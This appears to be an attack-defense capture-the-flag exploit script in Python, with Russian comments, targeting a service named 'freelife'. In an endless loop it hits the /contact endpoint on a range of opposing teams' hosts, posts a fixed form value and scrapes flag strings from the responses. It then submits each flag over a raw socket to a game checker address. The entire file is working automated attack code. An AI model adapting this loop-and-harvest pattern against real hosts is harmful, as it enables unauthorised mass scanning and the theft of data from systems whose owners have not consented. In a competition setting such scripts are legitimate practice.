# -*- coding: utf-8 -*-
import sys
import re
import requests as req
import json
import socket
# Порт сервиса и название
PORT = 8000
SERVICE = 'freelife'
FLAG_FORMAT = r"([a-zA-Z0-9]{33}=)"

def get(site):
    try:
        data = req.get(site)
        return data.text
    except req.exceptions.ConnectTimeout:
        #print(1)
        return None
    except req.exceptions.ReadTimeout:
        #print(2)
        return None
    except req.exceptions.ConnectionError:
        #print(3)
        return None


def post(site, data=None):
    try:

        data = req.post(site, data={'name': 'qwerafdgadg'})
        return data.text
    except req.exceptions.ConnectTimeout:
        #print(1)
        return None
    except req.exceptions.ReadTimeout:
        #print(2)
        return None
    except req.exceptions.ConnectionError:
        #print(3)
        return None


def find_flags(data):
    return re.findall(FLAG_FORMAT, data)


def exploit(url, Team):
    # Выполняем наш эксплойт для сервиса
    # После / пишем запрос эксплойта
    Status = True
    exp = '{url}:{port}/contact'.format(url=url, port=PORT)
    data = get(exp)
    if data is None:
        return None
    data = post(exp)
    #with open('s', 'w') as f:
    #   f.write(data)
    #print(124124)
    #a = input()
    #print(data)
    Flags = list()
    if data is None:
        Status = False
    else:
        Flags = find_flags(data)

    print(Flags)
    for flag in Flags:
        s1(flag)
    return json.dumps({
        "Team":     Team,           # Поля Team и Service необходимы для визуализации
        "Service":  SERVICE,
        "Flags":    Flags,
        "Status":   Status
    })

def s1(flag):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        HOST = '10.17.255.3'  # Адрес чекера
        PORT = 2605  # Порт чекера
        try:
            s.connect((HOST, PORT))
            msg = s.recv(1024).decode()
            s.send(flag.encode()+"\n".encode())
            msg = s.recv(1024)
            print(msg)
        except socket.error as msg:
            pass
        finally:
            s.close()


if __name__ == "__main__":
    # На вход получаем название команды и адрес команды
    #team = sys.argv[1]
    #url = sys.argv[2]
    #team = 'aaa'
    while True:
        for i in range(1, 20):
            if i != 12 and i != 18:
                print(i)
                url = 'http://10.17.{}.30'.format(i)
                d = exploit(url, None)
